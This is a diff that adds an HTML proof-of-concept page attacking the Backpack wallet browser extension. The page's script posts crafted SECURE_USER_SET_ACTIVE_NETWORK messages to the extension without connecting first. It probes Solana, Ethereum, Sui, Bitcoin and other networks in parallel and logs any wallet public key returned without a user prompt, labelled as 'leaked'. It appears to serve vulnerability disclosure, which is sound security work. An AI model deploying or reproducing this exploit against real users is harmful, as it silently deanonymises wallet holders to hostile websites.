@@ -1,0 +1,183 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Backpack SET_ACTIVE_NETWORK PoC</title>
+  <style>
+    body { font-family: monospace; background: #1a1a2e; color: #e0e0e0; padding: 24px; }
+    h1 { color: #ff6b6b; }
+    button { background: #ff6b6b; color: #fff; border: none; padding: 10px 20px; cursor: pointer; font-size: 14px; margin: 4px; border-radius: 4px; }
+    button:hover { background: #ee5a5a; }
+    pre { background: #16213e; padding: 16px; border-radius: 8px; overflow-x: auto; white-space: pre-wrap; word-break: break-all; }
+    .result { margin-top: 12px; }
+    .success { color: #4ecdc4; }
+    .error { color: #ff6b6b; }
+    .info { color: #ffd93d; }
+  </style>
+</head>
+<body>
+  <h1>SECURE_USER_SET_ACTIVE_NETWORK PoC</h1>
+  <p class="info">
+    This page sends <code>SECURE_USER_SET_ACTIVE_NETWORK</code> via postMessage without connecting to the origin first.
+    If the user's wallet is already on the requested network, the public key is returned silently (no UI prompt).
+  </p>
+
+  <div>
+    <button onclick="tryNetwork('solana', 'solana')">Solana Mainnet</button>
+    <button onclick="tryNetwork('ethereum', 'ethereum')">Ethereum Mainnet</button>
+    <button onclick="tryNetwork('solana', 'solana:EAQLJCV2mh23BsK2P9oYpV5CHVLDNHTxY')">Eclipse Mainnet</button>
+    <button onclick="tryNetwork('sui', 'sui')">Sui</button>
+    <button onclick="tryNetwork('bitcoin', 'bitcoin')">Bitcoin</button>
+    <button onclick="tryNetwork('aptos', 'aptos')">Aptos</button>
+    <button onclick="tryNetwork('tron', 'tron')">Tron</button>
+    <button onclick="tryAllNetworks()">Try All Networks</button>
+  </div>
+
+  <div class="result">
+    <h3>Results:</h3>
+    <pre id="output">Waiting...</pre>
+  </div>
+
+  <script>
+    const REQ_CHANNEL = "channel-secure-background-request";
+    const RESP_CHANNEL = "channel-secure-background-response";
+
+    // Simple UUID v4 generator
+    function uuid() {
+      return "xxxxxxxx-xxxx-4xxx-yxxx-xxxxxxxxxxxx".replace(/[xy]/g, (c) => {
+        const r = (Math.random() * 16) | 0;
+        return (c === "x" ? r : (r & 0x3) | 0x8).toString(16);
+      });
+    }
+
+    const pendingRequests = {};
+    const output = document.getElementById("output");
+
+    function log(msg, cls = "") {
+      const line = document.createElement("div");
+      line.className = cls;
+      line.textContent = typeof msg === "string" ? msg : JSON.stringify(msg, null, 2);
+      output.appendChild(line);
+      output.scrollTop = output.scrollHeight;
+    }
+
+    // Listen for responses from the Backpack content script
+    window.addEventListener("message", (event) => {
+      if (event.data?.type !== RESP_CHANNEL) return;
+      const { id, result, error } = event.data.detail || {};
+      if (!id || !pendingRequests[id]) return;
+
+      const { resolve, reject, label } = pendingRequests[id];
+      delete pendingRequests[id];
+
+      if (error) {
+        log(`[${label}] ERROR: ${error}`, "error");
+        reject(new Error(error));
+      } else {
+        log(`[${label}] Response:`, "success");
+        log(result, "success");
+        resolve(result);
+      }
+    });
+
+    function sendSetActiveNetwork(blockchain, blockchainId) {
+      return new Promise((resolve, reject) => {
+        const msgId = uuid();
+        const requestId = uuid();
+        const label = `${blockchain}/${blockchainId}`;
+
+        pendingRequests[msgId] = { resolve, reject, label };
+
+        // Timeout after 15s
+        setTimeout(() => {
+          if (pendingRequests[msgId]) {
+            delete pendingRequests[msgId];
+            log(`[${label}] Timed out (15s) — user may have rejected or Backpack not installed`, "error");
+            reject(new Error("timeout"));
+          }
+        }, 15000);
+
+        const secureRequest = {
+          name: "SECURE_USER_SET_ACTIVE_NETWORK",
+          origin: {
+            context: "browser",
+            name: document.title,
+            address: window.location.origin,
+          },
+          id: requestId,
+          request: {
+            blockchain: blockchain,
+            blockchainId: blockchainId,
+          },
+        };
+
+        log(`[${label}] Sending SECURE_USER_SET_ACTIVE_NETWORK...`, "info");
+
+        // This is the exact format the content script expects:
+        // It goes through proxy() -> chrome.runtime.sendMessage -> background service worker
+        window.postMessage(
+          {
+            type: REQ_CHANNEL,
+            detail: {
+              id: msgId,
+              method: "ContentScriptTransportSenderRequest",
+              params: [secureRequest],
+            },
+          },
+          "*"
+        );
+      });
+    }
+
+    async function tryNetwork(blockchain, blockchainId) {
+      output.innerHTML = "";
+      try {
+        const result = await sendSetActiveNetwork(blockchain, blockchainId);
+        if (result?.publicKey) {
+          log(`\nWallet address leaked: ${result.publicKey}`, "success");
+        }
+      } catch (e) {
+        // logged already
+      }
+    }
+
+    async function tryAllNetworks() {
+      output.innerHTML = "";
+      log("Probing all networks — if user is already on any of these, the public key is returned silently.\n", "info");
+
+      const networks = [
+        ["solana", "solana"],
+        ["ethereum", "ethereum"],
+        ["solana", "solana:EAQLJCV2mh23BsK2P9oYpV5CHVLDNHTxY"], // Eclipse
+        ["solana", "solana:CDLtwKnaCoK157uaHQDj4fHu72AyD2519"], // Fogo
+        ["solana", "solana:9qoRTAHGWBZHYzMJGkt62wBbFRASj6H7C"], // Sonic
+        ["sui", "sui"],
+        ["bitcoin", "bitcoin"],
+        ["aptos", "aptos"],
+        ["tron", "tron"],
+      ];
+
+      // Send all in parallel — whichever matches the user's current network returns instantly
+      const results = await Promise.allSettled(
+        networks.map(([bc, id]) => sendSetActiveNetwork(bc, id))
+      );
+
+      const leaked = results
+        .filter((r) => r.status === "fulfilled" && r.value?.publicKey)
+        .map((r) => r.value);
+
+      if (leaked.length > 0) {
+        log("\n=== LEAKED WALLET INFO ===", "success");
+        leaked.forEach((r) => {
+          log(`  Network: ${r.networkConfig?.blockchainId || "unknown"}`, "success");
+          log(`  Public Key: ${r.publicKey}`, "success");
+          log("", "success");
+        });
+      } else {
+        log("\nNo silent leaks — user may not have Backpack installed or is on a network not probed.", "info");
+      }
+    }
+  </script>
+</body>
+</html>
